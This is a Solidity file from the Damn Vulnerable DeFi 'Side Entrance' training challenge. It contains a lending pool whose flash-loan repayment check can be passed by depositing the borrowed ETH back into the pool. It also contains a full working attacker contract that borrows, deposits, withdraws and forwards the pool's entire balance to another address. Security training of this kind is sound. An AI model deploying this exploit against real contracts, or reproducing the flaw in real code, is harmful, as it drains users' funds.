// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceLenderPool {
    mapping(address => uint256) public balances;

    error RepayFailed();

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
}

contract AttackerContract {
    SideEntranceLenderPool public pool;
    address public recoveryAddr;

    constructor(SideEntranceLenderPool _pool, address _recoveryAddr) {
        pool = _pool;
        recoveryAddr = _recoveryAddr;
    }

    function attack() public {
        // 1. Take out a flash loan of the entire balance of the pool
        pool.flashLoan(address(pool).balance);
        // 3. the deposit function in callback updated the mapping and also make sures the flashloan test is passed
        // so we can call withdraw method to rescue the funds (mapping is updated)
        pool.withdraw();
    }

    // 2. called the flash loan callback, deposit the received ETH back into the pool to pass the balance
    // IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    function execute() public payable {
        pool.deposit{value: msg.value}();
    }

    // function transferToRecovery(address payable _recoveryAddr) private {
    //     SafeTransferLib.safeTransferETH(_recoveryAddr, address(this).balance);
    // }

    // 4. when we withdraw, pool transfer eth to this contract, we can use the receive function to transfer the funds to recovery account
    receive() external payable {
        // transferToRecovery(_recoveryAddr);
        SafeTransferLib.safeTransferETH(recoveryAddr, address(this).balance);
    }
}
